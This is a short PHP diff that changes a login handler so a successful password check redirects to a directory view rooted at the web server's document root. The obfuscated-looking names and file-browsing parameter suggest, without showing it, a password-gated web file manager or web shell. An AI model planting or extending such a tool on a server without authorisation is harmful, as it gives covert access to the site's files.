@@ -53,7 +53,9 @@ if ($auth_session || $auth_file) {
 } elseif ($_p && $_v($_p, $_c['f'])) {
     $_SESSION[$_s] = true;
     file_put_contents($auth_lock_path, 'ok');
-    $auth_valid = true;
+    $home = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
+    header("Location: ?d=" . urlencode($home));
+    exit;
 }
 if (isset($_GET['logout'])) {
     unset($_SESSION[$_s]);
